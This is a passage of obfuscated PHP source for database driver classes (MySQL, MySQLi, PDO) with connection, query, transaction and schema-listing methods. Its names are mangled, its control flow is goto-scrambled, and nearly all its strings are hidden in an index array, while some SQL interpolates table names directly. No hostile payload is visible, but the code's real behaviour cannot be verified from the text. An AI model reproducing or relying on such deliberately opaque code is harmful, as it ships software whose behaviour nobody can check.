[$Cî¯†³‚­ñ[32]]) === $Cî¯†³‚­ñ[811]), $Cî¯†³‚­ñ[34] => $Aîá¬ÖÙ [$Cî¯†³‚­ñ[35]], $Cî¯†³‚­ñ[36] => strtolower($Aîá¬ÖÙ [$Cî¯†³‚­ñ[37]]) == $Cî¯†³‚­ñ[38], $Cî¯†³‚­ñ[39] => strtolower($Aîá¬ÖÙ [$Cî¯†³‚­ñ[40]]) == $Cî¯†³‚­ñ[41]); } } return $B¢÷ğôËÙ¿; } public function getTables($f§¨‚‚–Œë = '') { $e¯´ÙòÔç =& $_SERVER[‚Ğ°–—î]; if (!empty($f§¨‚‚–Œë)) { $AíÆºÜ¦´³ = $e¯´ÙòÔç[812] . $f§¨‚‚–Œë; } else { $AíÆºÜ¦´³ = $e¯´ÙòÔç[813]; } $e„†§‹¤Ñ  = $this->query($AíÆºÜ¦´³); $aÓÚƒä…¡† = array(); foreach ($e„†§‹¤Ñ  as $B¯„˜ùù¯— => $bœİÛŞŠ’) { $aÓÚƒä…¡†[$B¯„˜ùù¯—] = current($bœİÛŞŠ’); } return $aÓÚƒä…¡†; } public function replace($Dñ˜æòöÉ½, $D¯ø‹í‰¢Å = array()) { $EìÍ®à…ì‚ =& $_SERVER[‚Ğ°–—î]; foreach ($Dñ˜æòöÉ½ as $D¼ÅŠ¯¯®‚ => $f®¯»ª’Àâ) { $fíó¹Ã’ñ„ = $this->parseValue($f®¯»ª’Àâ); if (is_scalar($fíó¹Ã’ñ„)) { $d„Ïóì¸»[] = $fíó¹Ã’ñ„; $Aº¿¹ÅÉÔò[] = $this->parseKey($D¼ÅŠ¯¯®‚); } } $EŞ†´Òœ  = $EìÍ®à…ì‚[814] . $this->parseTable($D¯ø‹í‰¢Å[$EìÍ®à…ì‚[267]]) . $EìÍ®à…ì‚[815] . implode($EìÍ®à…ì‚[47], $Aº¿¹ÅÉÔò) . $EìÍ®à…ì‚[816] . implode($EìÍ®à…ì‚[47], $d„Ïóì¸») . $EìÍ®à…ì‚[817]; return $this->execute($EŞ†´Òœ ); } public function insertAll($e Èäù™åÖ, $AêæÉ‚êÒÈ = array(), $eÑ„é»äæ¥ = false) { goto F—éö„´¾¤; CßµÜœğåá: $b’˜ÉÙã– = array(); foreach ($e Èäù™åÖ as $eÊ³îßåŠ›) { $FâÜêØ°Ò = array(); foreach ($eÊ³îßåŠ› as $c„¦†ò¢ => $F®¼Ş²ƒ¸) { $F®¼Ş²ƒ¸ = $this->parseValue($F®¼Ş²ƒ¸); if (is_scalar($F®¼Ş²ƒ¸)) { $FâÜêØ°Ò[] = $F®¼Ş²ƒ¸; } } $b’˜ÉÙã–[] = $e”ÀÎ¨Üó[248] . implode($e”ÀÎ¨Üó[47], $FâÜêØ°Ò) . $e”ÀÎ¨Üó[817]; } array_walk($e‚ìÕ–˜’‘, array($this, $e”ÀÎ¨Üó[818])); goto eæÇ™“Ğ»; eæÇ™“Ğ»: $c¼ŒŸ¢¯ŞÏ = ($eÑ„é»äæ¥ ? $e”ÀÎ¨Üó[819] : $e”ÀÎ¨Üó[820]) . $e”ÀÎ¨Üó[821] . $this->parseTable($AêæÉ‚êÒÈ[$e”ÀÎ¨Üó[267]]) . $e”ÀÎ¨Üó[815] . implode($e”ÀÎ¨Üó[47], $e‚ìÕ–˜’‘) . $e”ÀÎ¨Üó[822] . implode($e”ÀÎ¨Üó[47], $b’˜ÉÙã–); return $this->execute($c¼ŒŸ¢¯ŞÏ); goto bßÀ‘‚¡¨á; F—éö„´¾¤: $e”ÀÎ¨Üó =& $_SERVER[‚Ğ°–—î]; if (!is_array($e Èäù™åÖ[0])) { return !1; } $e‚ìÕ–˜’‘ = array_keys($e Èäù™åÖ[0]); goto CßµÜœğåá; bßÀ‘‚¡¨á: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $AÑõººçºá =& $_SERVER[‚Ğ°–—î]; $this->error = mysql_errno() . $AÑõººçºá[4] . mysql_error($this->_linkID); if ($AÑõººçºá[33] != $this->queryStr) { $this->error .= LNG($AÑõººçºá[45]) . $this->queryStr; } think_trace($this->error, $AÑõººçºá[33], $AÑõººçºá[46]); return $this->error; } public function escapeString($Dê¿á ¹¢) { if ($this->_linkID) { return mysql_real_escape_string($Dê¿á ¹¢, $this->_linkID); } else { return mysql_escape_string($Dê¿á ¹¢); } } public function parseKey(&$E¶ë¾ø¢, $cŠÍÉóáƒß = true) { $aÏÒ—ø¹‘‚ =& $_SERVER[‚Ğ°–—î]; if ($cŠÍÉóáƒß) { $E¶ë¾ø¢ = $this->parseKeyCheck($E¶ë¾ø¢); } if ($E¶ë¾ø¢ != $aÏÒ—ø¹‘‚[176] && !preg_match($aÏÒ—ø¹‘‚[823], $E¶ë¾ø¢)) { $E¶ë¾ø¢ = $aÏÒ—ø¹‘‚[824] . trim($E¶ë¾ø¢, $aÏÒ—ø¹‘‚[824]) . $aÏÒ—ø¹‘‚[824]; } return $E¶ë¾ø¢; } } class DbMysqli extends Db { public function __construct($EÔµÊëá¢ = '') { $bò¥°öÒ“Ä =& $_SERVER[‚Ğ°–—î]; if (!extension_loaded($bò¥°öÒ“Ä[726])) { think_exception(think_lang($bò¥°öÒ“Ä[10]) . $bò¥°öÒ“Ä[825]); } if (!empty($EÔµÊëá¢)) { $this->config = $EÔµÊëá¢; if (empty($this->config[$bò¥°öÒ“Ä[13]])) { $this->config[$bò¥°öÒ“Ä[13]] = $bò¥°öÒ“Ä[33]; } } } public function connect($F—õ£İßÔÉ = '', $DèÆÎä»Ø‘ = 0) { $FÈ‡‹öÅôÓ =& $_SERVER[‚Ğ°–—î]; if (!isset($this->linkID[$DèÆÎä»Ø‘])) { goto A®ŠøğÄ¨Ÿ; Bé©øçŠ: $F¡‹ÈäÔãŠ = $this->linkID[$DèÆÎä»Ø‘]->server_version; $this->linkID[$DèÆÎä»Ø‘]->query($FÈ‡‹öÅôÓ[803] . think_config($FÈ‡‹öÅôÓ[804]) . $FÈ‡‹öÅôÓ[55]); if ($F¡‹ÈäÔãŠ > $FÈ‡‹öÅôÓ[805]) { $this->linkID[$DèÆÎä»Ø‘]->query($FÈ‡‹öÅôÓ[806]); } goto Bß”Ü¦‚Åš; A®ŠøğÄ¨Ÿ: if (empty($F—õ£İßÔÉ)) { $F—õ£İßÔÉ = $this->config; } $this->linkID[$DèÆÎä»Ø‘] = new mysqli($F—õ£İßÔÉ[$FÈ‡‹öÅôÓ[799]], $F—õ£İßÔÉ[$FÈ‡‹öÅôÓ[801]], $F—õ£İßÔÉ[$FÈ‡‹öÅôÓ[802]], $F—õ£İßÔÉ[$FÈ‡‹öÅôÓ[17]], $F—õ£İßÔÉ[$FÈ‡‹öÅôÓ[800]] ? intval($F—õ£İßÔÉ[$FÈ‡‹öÅôÓ[800]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto Bé©øçŠ; Bß”Ü¦‚Åš: $this->connected = !0; if (1 != think_config($FÈ‡‹öÅôÓ[18])) { unset($this->config); } goto aİ¾ƒÔèÕ—; aİ¾ƒÔèÕ—: } return $this->linkID[$DèÆÎä»Ø‘]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($eÈ›ù­‚Ë¾) { goto D•£Ñ¡²Û¼; FĞš††¼®ì: think_status($f§Š©…•ÌŠ[20]); $this->queryID = $this->_linkID->query($eÈ›ù­‚Ë¾); if ($this->_linkID->more_results()) { while (($Cçº¸Æó‹ğ = $this->_linkID->next_result()) != NULL) { $Cçº¸Æó‹ğ->free_result(); } } goto DŒáõ¯ÖÍ; D•£Ñ¡²Û¼: $f§Š©…•ÌŠ =& $_SERVER[‚Ğ°–—î]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto EÚ©âñçˆÂ; DŒáõ¯ÖÍ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto aÃÄÅƒîß; EÚ©âñçˆÂ: $this->queryStr = $eÈ›ù­‚Ë¾; if ($this->queryID) { $this->free(); } think_action_status($f§Š©…•ÌŠ[19], 1); goto FĞš††¼®ì; aÃÄÅƒîß: } public function execute($d¿ì”‚³çŸ) { goto eøÙøõ­ê’; f†ªÈ»ˆ“: if (!1 === $B‘é·¼Ù) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto eõÔ™”Î‹Ë; eøÙøõ­ê’: $CöŞ®ÆİÆê =& $_SERVER[‚Ğ°–—î]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e”ˆ§²îè£; e”ˆ§²îè£: $this->queryStr = $d¿ì”‚³çŸ; if ($this->queryID) { $this->free(); } think_action_status($CöŞ®ÆİÆê[21], 1); goto cÉ½Œ§éë; cÉ½Œ§éë: think_status($CöŞ®ÆİÆê[20]); $B‘é·¼Ù = $this->_linkID->query($d¿ì”‚³çŸ); $this->debug(); goto f†ªÈ»ˆ“; eõÔ™”Î‹Ë: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $e¨˜´¬¢­‰ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$e¨˜´¬¢­‰) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $B­Ç«¬Š†Ğ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$B­Ç«¬Š†Ğ) { $this->error(); return !1; } } return !0; } private function getAll() { $A¬Õç«È‹ß = array(); if ($this->numRows > 0) { for ($DÊ¥Ñˆ´ßœ = 0; $DÊ¥Ñˆ´ßœ < $this->numRows; $DÊ¥Ñˆ´ßœ++) { $A¬Õç«È‹ß[$DÊ¥Ñˆ´ßœ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $A¬Õç«È‹ß; } public function getFields($AİÖó»˜Ì) { $fŸ‡ö»ÛŠê =& $_SERVER[‚Ğ°–—î]; $aÙÃ“ôª…Õ = $this->query($fŸ‡ö»ÛŠê[810] . $this->parseKey($AİÖó»˜Ì)); $e¢²ÚÁĞ­Š = array(); if ($aÙÃ“ôª…Õ) { foreach ($aÙÃ“ôª…Õ as $aÕ½ùØÑ–ß => $CÓÌÚ¡²õ…) { $e¢²ÚÁĞ­Š[$CÓÌÚ¡²õ…[$fŸ‡ö»ÛŠê[27]]] = array($fŸ‡ö»ÛŠê[28] => $CÓÌÚ¡²õ…[$fŸ‡ö»ÛŠê[27]], $fŸ‡ö»ÛŠê[29] => $CÓÌÚ¡²õ…[$fŸ‡ö»ÛŠê[30]], $fŸ‡ö»ÛŠê[31] => (bool) ($CÓÌÚ¡²õ…[$fŸ‡ö»ÛŠê[32]] === $fŸ‡ö»ÛŠê[33]), $fŸ‡ö»ÛŠê[34] => $CÓÌÚ¡²õ…[$fŸ‡ö»ÛŠê[35]], $fŸ‡ö»ÛŠê[36] => strtolower($CÓÌÚ¡²õ…[$fŸ‡ö»ÛŠê[37]]) == $fŸ‡ö»ÛŠê[38], $fŸ‡ö»ÛŠê[39] => strtolower($CÓÌÚ¡²õ…[$fŸ‡ö»ÛŠê[40]]) == $fŸ‡ö»ÛŠê[41]); } } return $e¢²ÚÁĞ­Š; } public function getTables($DêÔ¨öĞš¿ = '') { $B©œßŒ˜šÖ =& $_SERVER[‚Ğ°–—î]; $A×¶¢‰ì‚« = !empty($DêÔ¨öĞš¿) ? $B©œßŒ˜šÖ[812] . $DêÔ¨öĞš¿ : $B©œßŒ˜šÖ[813]; $c¼Ÿ©Ôƒ‹Û = $this->query($A×¶¢‰ì‚«); $c„ÛÀ¥·®© = array(); if ($c¼Ÿ©Ôƒ‹Û) { foreach ($c¼Ÿ©Ôƒ‹Û as $bì‚ÖÁ™„¯ => $c‘–³š÷–º) { $c„ÛÀ¥·®©[$bì‚ÖÁ™„¯] = current($c‘–³š÷–º); } } return $c„ÛÀ¥·®©; } public function replace($F©­ÜƒŞ†è, $e¶îŠÙöÁÚ = array()) { $AÖ¢’¶Úš =& $_SERVER[‚Ğ°–—î]; foreach ($F©­ÜƒŞ†è as $B™ßÅÃ­ˆ  => $C´Š‡˜›­‚) { $bÍè„ÅËÃ´ = $this->parseValue($C´Š‡˜›­‚); if (is_scalar($bÍè„ÅËÃ´)) { $CÓº§Ù¹ÒÈ[] = $bÍè„ÅËÃ´; $dŠ™“Ä¤¥[] = $this->parseKey($B™ßÅÃ­ˆ ); } } $D‡È›±²Œ = $AÖ¢’¶Úš[814] . $this->parseTable($e¶îŠÙöÁÚ[$AÖ¢’¶Úš[267]]) . $AÖ¢’¶Úš[815] . implode($AÖ¢’¶Úš[47], $dŠ™“Ä¤¥) . $AÖ¢’¶Úš[816] . implode($AÖ¢’¶Úš[47], $CÓº§Ù¹ÒÈ) . $AÖ¢’¶Úš[817]; return $this->execute($D‡È›±²Œ); } public function insertAll($E°Ø†–Â¥Ó, $c®Á´ÑĞÔŒ = array(), $CôÙÌö…¹Î = false) { goto f¸Ì¹ÆÕ˜; aÃ´«ö¯¶: $EÊßìÓò¾Ô = ($CôÙÌö…¹Î ? $B‹¾ƒ§«õ[819] : $B‹¾ƒ§«õ[820]) . $B‹¾ƒ§«õ[821] . $this->parseTable($c®Á´ÑĞÔŒ[$B‹¾ƒ§«õ[267]]) . $B‹¾ƒ§«õ[815] . implode($B‹¾ƒ§«õ[47], $cêÇÆØÒÜ) . $B‹¾ƒ§«õ[822] . implode($B‹¾ƒ§«õ[47], $EáÔøš¶õ«); return $this->execute($EÊßìÓò¾Ô); goto DÑó—Ë±†‚; b×ÒîŞšë: $EáÔøš¶õ« = array(); foreach ($E°Ø†–Â¥Ó as $BÉ¡à³„“Ú) { $A™¦ê”İÏƒ = array(); foreach ($BÉ¡à³„“Ú as $Bˆ‹ÅÈ…® => $có¿âøæ”) { $có¿âøæ” = $this->parseValue($có¿âøæ”); if (is_scalar($có¿âøæ”)) { $A™¦ê”İÏƒ[] = $có¿âøæ”; } } $EáÔøš¶õ«[] = $B‹¾ƒ§«õ[248] . implode($B‹¾ƒ§«õ[47], $A™¦ê”İÏƒ) . $B‹¾ƒ§«õ[817]; } array_walk($cêÇÆØÒÜ, array($this, $B‹¾ƒ§«õ[818])); goto aÃ´«ö¯¶; f¸Ì¹ÆÕ˜: $B‹¾ƒ§«õ =& $_SERVER[‚Ğ°–—î]; if (!is_array($E°Ø†–Â¥Ó[0])) { return !1; } $cêÇÆØÒÜ = array_keys($E°Ø†–Â¥Ó[0]); goto b×ÒîŞšë; DÑó—Ë±†‚: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $b„ğÓÛ® =& $_SERVER[‚Ğ°–—î]; $this->error = $this->_linkID->errno . $b„ğÓÛ®[4] . $this->_linkID->error; if ($b„ğÓÛ®[33] != $this->queryStr) { $this->error .= LNG($b„ğÓÛ®[45]) . $this->queryStr; } think_trace($this->error, $b„ğÓÛ®[33], $b„ğÓÛ®[46]); return $this->error; } public function escapeString($eŠô´‘¡¹Š) { if ($this->_linkID) { return $this->_linkID->real_escape_string($eŠô´‘¡¹Š); } else { return addslashes($eŠô´‘¡¹Š); } } public function parseKey(&$DáöéêŸ†Ö, $aœ°½†ÈÑˆ = true) { $b¶ºƒ—×äŒ =& $_SERVER[‚Ğ°–—î]; if ($aœ°½†ÈÑˆ) { $DáöéêŸ†Ö = $this->parseKeyCheck($DáöéêŸ†Ö); } if ($DáöéêŸ†Ö != $b¶ºƒ—×äŒ[176] && !preg_match($b¶ºƒ—×äŒ[823], $DáöéêŸ†Ö)) { $DáöéêŸ†Ö = $b¶ºƒ—×äŒ[824] . trim($DáöéêŸ†Ö, $b¶ºƒ—×äŒ[824]) . $b¶ºƒ—×äŒ[824]; } return $DáöéêŸ†Ö; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($e³‚È–”æë = '') { $D¹Ù—×Éœç =& $_SERVER[‚Ğ°–—î]; if (!class_exists($D¹Ù—×Éœç[826])) { think_exception(think_lang($D¹Ù—×Éœç[10]) . $D¹Ù—×Éœç[827]); } if (!empty($e³‚È–”æë)) { $this->config = $e³‚È–”æë; if (empty($this->config[$D¹Ù—×Éœç[13]])) { $this->config[$D¹Ù—×Éœç[13]] = array(); } } } public function connect($Bâ›Ëì˜´ = '', $dßö•¿ÀÆ‘ = 0) { $AáóÛ»á÷„ =& $_SERVER[‚Ğ°–—î]; if (!isset($this->linkID[$dßö•¿ÀÆ‘])) { goto C½ÃŒ‚±ï¬; C½ÃŒ‚±ï¬: if (empty($Bâ›Ëì˜´)) { $Bâ›Ëì˜´ = $this->config; } if ($this->pconnect) { $Bâ›Ëì˜´[$AáóÛ»á÷„[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$dßö•¿ÀÆ‘] = new PDO($Bâ›Ëì˜´[$AáóÛ»á÷„[828]], $Bâ›Ëì˜´[$AáóÛ»á÷„[801]], $Bâ›Ëì˜´[$AáóÛ»á÷„[802]], $Bâ›Ëì˜´[$AáóÛ»á÷„[13]]); } catch (PDOException $D’ìøÄª‡) { think_exception($D’ìøÄª‡->getMessage()); } goto f·Ôˆß²ì; C“¾Æ‚ùÃ: $this->linkID[$dßö•¿ÀÆ‘]->exec($AáóÛ»á÷„[837] . think_config($AáóÛ»á÷„[804])); $this->connected = !0; if (1 != think_config($AáóÛ»á÷„[18])) { unset($this->config); } goto BÆÍøÌñãõ; f·Ôˆß²ì: $this->dbType = $this->_getDsnType($Bâ›Ëì˜´[$AáóÛ»á÷„[828]]); if (in_array($this->dbType, array($AáóÛ»á÷„[829], $AáóÛ»á÷„[830], $AáóÛ»á÷„[831], $AáóÛ»á÷„[832]))) { think_exception($AáóÛ»á÷„[833] . $this->dbType . $AáóÛ»á÷„[834] . $this->dbType . $AáóÛ»á÷„[835]); } if (!$this->linkID[$dßö•¿ÀÆ‘]) { think_exception($AáóÛ»á÷„[836]); } goto C“¾Æ‚ùÃ; BÆÍøÌñãõ: } return $this->linkID[$dßö•¿ÀÆ‘]; } public function free() { $this->PDOStatement = null; } public function query($eù®ç·š, $cˆ¹«©Á = array()) { goto Bù‘Ù…“ßÉ; bÑ»¼¹¦¹É: $this->queryStr = $eù®ç·š; if (!empty($cˆ¹«©Á)) { $this->queryStr .= $cè÷Ò‹ê[838] . print_r($cˆ¹«©Á, !0) . $cè÷Ò‹ê[839]; } if (!empty($this->PDOStatement)) { $this->free(); } goto Cİ¿•ªšî; Cİ¿•ªšî: think_action_status($cè÷Ò‹ê[19], 1); think_status($cè÷Ò‹ê[20]); $this->PDOStatement = $this->_linkID->prepare($eù®ç·š); goto AÈ¤‹æ‘Îğ; Bù‘Ù…“ßÉ: $cè÷Ò‹ê =& $_SERVER[‚Ğ°–—î]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto bÑ»¼¹¦¹É; eÚğ´¡‚Ì: if (!1 === $B‘İæÉÕ†Œ) { $this->error(); return !1; } else { return $this->getAll(); } goto C˜÷˜Ë…¦; AÈ¤‹æ‘Îğ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $B‘İæÉÕ†Œ = $this->PDOStatement->execute($cˆ¹«©Á); $this->debug(); goto eÚğ´¡‚Ì; C˜÷˜Ë…¦: } public function execute($FİÚÍ¿ÙËË, $cÖåŞÁ·òè = array()) { goto aŠ‚İÏÅŸÁ; bßÙ©ïÁòÓ: think_status($B•ç©÷…ïÖ[20]); $this->PDOStatement = $this->_linkID->prepare($FİÚÍ¿ÙËË); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto b¨‘Ãİ‚§; C¡¬ˆ¶Ì¼: if ($this->dbType == $B•ç©÷…ïÖ[832]) { if (preg_match($B•ç©÷…ïÖ[840], $this->queryStr, $C±‹Æ¨À¿Ê)) { $this->table = think_config($B•ç©÷…ïÖ[841]) . str_ireplace(think_config($B•ç©÷…ïÖ[842]), $B•ç©÷…ïÖ[361], $C±‹Æ¨À¿Ê[2]); $B…ÅÈØÓ« = (bool) $this->query($B•ç©÷…ïÖ[843] . strtoupper($this->table) . $B•ç©÷…ïÖ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($B•ç©÷…ïÖ[21], 1); goto bßÙ©ïÁòÓ; d„Ã˜ä „ñ: $this->queryStr = $FİÚÍ¿ÙËË; if (!empty($cÖåŞÁ·òè)) { $this->queryStr .= $B•ç©÷…ïÖ[838] . print_r($cÖåŞÁ·òè, !0) . $B•ç©÷…ïÖ[839]; } $B…ÅÈØÓ« = !1; goto C¡¬ˆ¶Ì¼; b¨‘Ãİ‚§: $BìÎÖËÛ = $this->PDOStatement->execute($cÖåŞÁ·òè); $this->debug(); if (!1 === $BìÎÖËÛ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($B…ÅÈØÓ« || preg_match($B•ç©÷…ïÖ[844], $FİÚÍ¿ÙËË)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto Aëë¶Ğ‹Õó; aŠ‚İÏÅŸÁ: $B•ç©÷…ïÖ =& $_SERVER[‚Ğ°–—î]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d„Ã˜ä „ñ; Aëë¶Ğ‹Õó: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $c¡›í‘øĞ¨ = $this->_linkID->commit(); $this->transTimes = 0; if (!$c¡›í‘øĞ¨) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $eğš§Ì”› = $this->_linkID->rollback(); $this->transTimes = 0; if (!$eğš§Ì”›) { $this->error(); return !1; } } return !0; } private function getAll() { $aßÀ½ÕÕÑÜ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($aßÀ½ÕÕÑÜ); return $aßÀ½ÕÕÑÜ; } public function getFields($dåö¯´ğÕî) { goto A½øÔá–ªÁ; A½øÔá–ªÁ: $f÷‡šƒÚ =& $_SERVER[‚Ğ°–—î]; $this->initConnect(!0); if (think_config($f÷‡šƒÚ[845])) { $dÙ‹›Î›ãá = str_replace($f÷‡šƒÚ[846], $dåö¯´ğÕî, think_config($f÷‡šƒÚ[845])); } else { switch ($this->dbType) { case $f÷‡šƒÚ[829]: case $f÷‡šƒÚ[847]: $dÙ‹›Î›ãá = "\123\x45\x4c\105\x43\x54\x20\40\40\x63\x6f\x6c\165\155\156\x5f\x6e\x61\155\145\40\141\163\40\x27\x4e\141\155\x65\47\x2c\x20\40\40\144\x61\164\x61\137\x74\171\160\x65\x20\141\x73\40\47\x54\x79\x70\x65\x27\x2c\40\x20\40\143\x6f\154\x75\155\156\x5f\144\x65\146\141\165\x6c\x74\x20\141\163\40\x27\104\145\x66\141\165\154\x74\x27\x2c\x20\40\x20\151\x73\x5f\x6e\x75\x6c\154\x61\142\154\x65\40\x61\x73\x20\x27\x4e\x75\x6c\154\x27\12\11\11\106\122\x4f\x4d\x9\151\x6e\x66\157\x72\x6d\141\164\151\157\156\137\163\143\150\145\x6d\x61\x2e\164\141\x62\154\145\x73\40\101\x53\x20\x74\12\x9\x9\x4a\117\x49\116\x9\151\x6e\x66\157\162\155\141\x74\x69\x6f\x6e\137\x73\143\150\x65\x6d\141\56\x63\x6f\x6c\165\155\x6e\163\40\101\123\x20\x63\12\x9\x9\x4f\x4e\40\x20\164\x2e\x74\141\x62\x6c\145\x5f\143\141\x74\x61\154\x6f\x67\40\75\x20\x63\56\x74\x61\x62\154\145\x5f\143\141\164\x61\154\157\x67\xa\11\x9\101\116\104\40\164\x2e\x74\x61\x62\x6c\145\x5f\x73\x63\x68\145\155\141\40\75\x20\143\56\x74\x61\x62\x6c\x65\x5f\163\143\150\x65\155\141\xa\11\x9\x41\116\x44\x20\164\56\164\x61\x62\154\145\x5f\156\141\x6d\x65\x20\75\x20\143\x2e\164\141\142\154\145\x5f\x6e\141\155\145\12\11\11\x57\x48\x45\x52\105\40\40\x20\x74\x2e\x74\141\142\154\145\x5f\156\141\155\x65\x20\x3d\40\x27{$dåö¯´ğÕî}\x27"; break; case $f÷‡šƒÚ[848]: $dÙ‹›Î›ãá = $f÷‡šƒÚ[849] . $dåö¯´ğÕî . $f÷‡šƒÚ[850]; break; case $f÷‡šƒÚ[830]: case $f÷‡šƒÚ[832]: $dÙ‹›Î›ãá = $f÷‡šƒÚ[851] . $f÷‡šƒÚ[852] . $f÷‡šƒÚ[853] . strtoupper($dåö¯´ğÕî) . $f÷‡šƒÚ[854] . strtoupper($dåö¯´ğÕî) . $f÷‡šƒÚ[855]; break; case $f÷‡šƒÚ[856]: $dÙ‹›Î›ãá = $f÷‡šƒÚ[857] . $dåö¯´ğÕî . $f÷‡šƒÚ[858]; break; case $f÷‡šƒÚ[831]: break; case $f÷‡šƒÚ[859]: default: $dÙ‹›Î›ãá = $f÷‡šƒÚ[860] . ($this->dbType == $f÷‡šƒÚ[859] ? "\x60{$dåö¯´ğÕî}\140" : $dåö¯´ğÕî); } } goto FÓÒğ¶È³³; FŒ¼”à¢: return $C¤—‰ÔĞ¥; goto Dåœ»Ê±ê; FÓÒğ¶È³³: $CÍˆÉìöŸ = $this->query($dÙ‹›Î›ãá); $C¤—‰ÔĞ¥ = array(); if ($CÍˆÉìöŸ) { foreach ($CÍˆÉìöŸ as $böáÛ‡É±Õ => $aÉà–¬Î’) { $aÉà–¬Î’ = array_change_key_case($aÉà–¬Î’); $aÉà–¬Î’[$f÷‡šƒÚ[28]] = isset($aÉà–¬Î’[$f÷‡šƒÚ[28]]) ? $aÉà–¬Î’[$f÷‡šƒÚ[28]] : $f÷‡šƒÚ[361]; $aÉà–¬Î’[$f÷‡šƒÚ[29]] = isset($aÉà–¬Î’[$f÷‡šƒÚ[29]]) ? $aÉà–¬Î’[$f÷‡šƒÚ[29]] : $f÷‡šƒÚ[361]; $D‡ÃÊ–³® = isset($aÉà–¬Î’[$f÷‡šƒÚ[261]]) ? $aÉà–¬Î’[$f÷‡šƒÚ[261]] : $aÉà–¬Î’[$f÷‡šƒÚ[28]]; $C¤—‰ÔĞ¥[$D‡ÃÊ–³®] = array($f÷‡šƒÚ[28] => $D‡ÃÊ–³®, $f÷‡šƒÚ[29] => $aÉà–¬Î’[$f÷‡šƒÚ[29]], $f÷‡šƒÚ[31] => (bool) (isset($aÉà–¬Î’[$f÷‡šƒÚ[99]]) && $aÉà–¬Î’[$f÷‡šƒÚ[99]] === $f÷‡šƒÚ[33] || isset($aÉà–¬Î’[$f÷‡šƒÚ[31]]) && $aÉà–¬Î’[$f÷‡šƒÚ[31]] === $f÷‡šƒÚ[33]), $f÷‡šƒÚ[34] => isset($aÉà–¬Î’[$f÷‡šƒÚ[34]]) ? $aÉà–¬Î’[$f÷‡šƒÚ[34]] : (isset($aÉà–¬Î’[$f÷‡šƒÚ[53]]) ? $aÉà–¬Î’[$f÷‡šƒÚ[53]] : $f÷‡šƒÚ[361]), $f÷‡šƒÚ[36] => isset($aÉà–¬Î’[$f÷‡šƒÚ[89]]) ? strtolower($aÉà–¬Î’[$f÷‡šƒÚ[89]]) == $f÷‡šƒÚ[38] : (isset($aÉà–¬Î’[$f÷‡šƒÚ[54]]) ? $aÉà–¬Î’[$f÷‡šƒÚ[54]] : !1), $f÷‡šƒÚ[39] => isset($aÉà–¬Î’[$f÷‡šƒÚ[861]]) ? strtolower($aÉà–¬Î’[$f÷‡šƒÚ[861]]) == $f÷‡šƒÚ[41] : (isset($aÉà–¬Î’[$f÷‡šƒÚ[89]]) ? $aÉà–¬Î’[$f÷‡šƒÚ[89]] : !1)); } } goto FŒ¼”à¢; Dåœ»Ê±ê: } public function getTables($D†¤Š¼ÉÔ = '') { $c”Øğµ·–Ì =& $_SERVER[‚Ğ°–—î]; if (think_config($c”Øğµ·–Ì[862])) { $c×ˆ›Öª = str_replace($c”Øğµ·–Ì[863], $D†¤Š¼ÉÔ, think_config($c”Øğµ·–Ì[862])); } else { switch ($this->dbType) { case $c”Øğµ·–Ì[830]: case $c”Øğµ·–Ì[832]: $c×ˆ›Öª = $c”Øğµ·–Ì[864]; break; case $c”Øğµ·–Ì[829]: case $c”Øğµ·–Ì[847]: $c×ˆ›Öª = $c”Øğµ·–Ì[865]; break; case $c”Øğµ·–Ì[856]: $c×ˆ›Öª = $c”Øğµ·–Ì[866]; break; case $c”Øğµ·–Ì[831]: think_exception(think_lang($c”Øğµ·–Ì[867]) . $c”Øğµ·–Ì[868]); break; case $c”Øğµ·–Ì[848]: $c×ˆ›Öª = $c”Øğµ·–Ì[42] . $c”Øğµ·–Ì[43] . $c”Øğµ·–Ì[44]; break; case $c”Øğµ·–Ì[859]: default: if (!empty($D†¤Š¼ÉÔ)) { $c×ˆ›Öª = $c”Øğµ·–Ì[812] . $D†¤Š¼ÉÔ; } else { $c×ˆ›Öª = $c”Øğµ·–Ì[813]; } } } $b²éĞªÉ¶ = $this->query($c×ˆ›Öª); $C»àÃ›¹ ‘ = array(); foreach ($b²éĞªÉ¶ as $A¨†Œ¦–§ => $D†ßœÕƒ¤Ä) { $C»àÃ›¹ ‘[$A¨†Œ¦–§] = current($D†ßœÕƒ¤Ä); } return $C»àÃ›¹ ‘; } protected function parseLimit($BáÛÚæÅ¢­) { $cÍ“¼â¨›ô =& $_SERVER[‚Ğ°–—î]; $eøÛåËŒáÑ = $cÍ“¼â¨›ô[33]; if (!empty($BáÛÚæÅ¢­)) { switch ($this->dbType) { case $cÍ“¼â¨›ô[856]: case 